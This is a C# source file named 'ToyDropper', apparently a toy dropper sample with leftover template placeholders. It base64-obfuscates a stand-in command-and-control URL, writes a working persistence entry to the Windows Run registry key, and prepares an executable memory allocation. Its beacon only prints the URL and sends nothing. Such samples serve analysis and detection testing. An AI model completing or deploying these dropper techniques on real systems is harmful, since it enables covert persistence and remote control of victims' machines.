using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace ToyDropper
{
	internal class Program
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		private static readonly string Marker = "ToyDropper-{marker}";

		public int Count => 3;

		private static void Main(string[] args)
		{
			string url = Decode("aHR0cDovL2MyLmV4YW1wbGUuaW52YWxpZC9nYXRl");
			if (args.Length == 0)
			{
				Persist();
			}
			Beacon(url);
		}

		private static string Decode(string s)
		{
			byte[] bytes = Convert.FromBase64String(s);
			return Encoding.UTF8.GetString(bytes);
		}

		private static void Persist()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("ToyDropper", "C:\\Users\\Public\\toy.exe");
		}

		private static void Beacon(string url)
		{
			using WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "ToyAgent/1.0 {braces}");
			Console.WriteLine(url);
		}

		private static void Unused()
		{
			IntPtr intPtr = VirtualAlloc(IntPtr.Zero, 4096u, 12288u, 64u);
		}
	}
}
